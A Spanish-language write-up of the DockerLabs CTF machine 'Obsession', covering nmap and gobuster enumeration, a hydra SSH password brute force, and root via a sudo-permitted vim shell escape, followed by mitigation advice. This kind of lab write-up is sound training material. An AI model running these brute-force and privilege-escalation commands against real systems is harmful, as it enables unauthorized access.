# Writeup: Obsession

- **Máquina:** Obsession (DockerLabs)
- **Enlace:** https://dockerlabs.es/maquinas/144/descargar
- **Dificultad:** Muy Fácil
- **Fecha:** 26 de Octubre 2026

---

## Objetivo
Acceder a privilegios `root` utilizando herramientas de enumeración web y fuerza bruta.

---

## Despliegue de la máquina
```bash
$ sudo bash auto_deploy.sh obsession.tar
```
<img width="576" height="360" alt="Captura de pantalla (273)" src="https://github.com/user-attachments/assets/b0f2c062-c699-4a3f-99b2-4e922598b0d6" />

Para comprobar que el server este activo se usó `ping`:

```bash
$ ping 172.17.0.2
```

```bash
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.058 ms
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.175 ms
```

---

## 1. Reconocimiento
Se realizó escaneo de puertos con `nmap`, revelando tres puertos abiertos:

```bash
$ sudo nmap -p- 172.17.0.2 -oN scanobsession.txt
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  tcp 
22/tcp open  ssh    
80/tcp open  http   
```
El parámetro `-oN scanobsession.txt` permite guardar toda la información devuelta por `nmap` en un archivo `.txt`. Gracias a esto, pueden consultarse los puertos abiertos sin necesidad de volver a utilizar `nmap`.

Una vez hecho esto, se utilizó `gobuster` para listar directorios ocultos: 
```bash
$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt
```

<img width="668" height="369" alt="Captura de pantalla (276)" src="https://github.com/user-attachments/assets/506fd7e2-500b-442f-b149-a2aa855ffdb0" />


--- 

## 2. Identificación de vulnerabilidades
Si nos dirigimos a **http://172.17.0.2/backup** en el navegador, podemos ver un archivo `.txt` que revela la existencia de un usuario valido. 

<img width="547" height="212" alt="Captura de pantalla (277)" src="https://github.com/user-attachments/assets/7e98212d-eed3-42e4-83ae-cdb6d738c497" />

```bash
Usuario para todos mis servicios: russoski (cambiar pronto!)
```
Sabiendo el nombre de este usuario, se pasa a la fase de Explotación.


---
## 3. Explotación
### 1. Ataque de fuerza bruta a user russoski
Se utilizó el siguiente comando de `hydra` para hacernos con las credenciales del usuario:

```bash
$ hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

```bash
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```
Sabiendo la contraseña, procedemos a conectarnos como el usuario **russoski** utilizando `ssh`:

```bash
$ ssh russoski@172.17.0.2
```
<img width="298" height="56" alt="Captura de pantalla (280)" src="https://github.com/user-attachments/assets/6500cb17-0817-4734-b586-e79780118135" />


### 2. Escalada de privilegios 
Si usamos `sudo -l`, podemos ver que **russoski** tiene permisos para ejecutar `vim` como `root`. 

<img width="513" height="62" alt="Captura de pantalla (281)" src="https://github.com/user-attachments/assets/ee00cc3f-ec99-4098-8a99-9e2a748a476e" />


Ejecutamos `sudo vim -c ':!/bin/bash'` para acceder a los privilegios `root`.

<img width="340" height="63" alt="Captura de pantalla (282)" src="https://github.com/user-attachments/assets/acc7d2c2-dd2f-4590-9b93-8e66c94bf331" />



---
## Acciones de mitigación
- **Escalada de privilegios mediante `vim`**: aplicar principio de menor privilegio o retirar `vim` de sudoers.
- **Contraseña débil vulnerable a ataques de fuerza bruta**: aplicar políticas de contraseñas más seguras e implementar verificación en dos pasos (MFA).
- **Archivo `.txt` con información sensible expuesto en internet**: bloquear la ruta `/backup` a usuarios sin permisos, no almacenar archivos de texto en la raíz pública de servidor web.
---
## Conclusión
Obsession es una máquina que permite pulir enumeración web y comprender lo peligroso que es dejar archivos con información sensible en una ruta de fácil acceso.
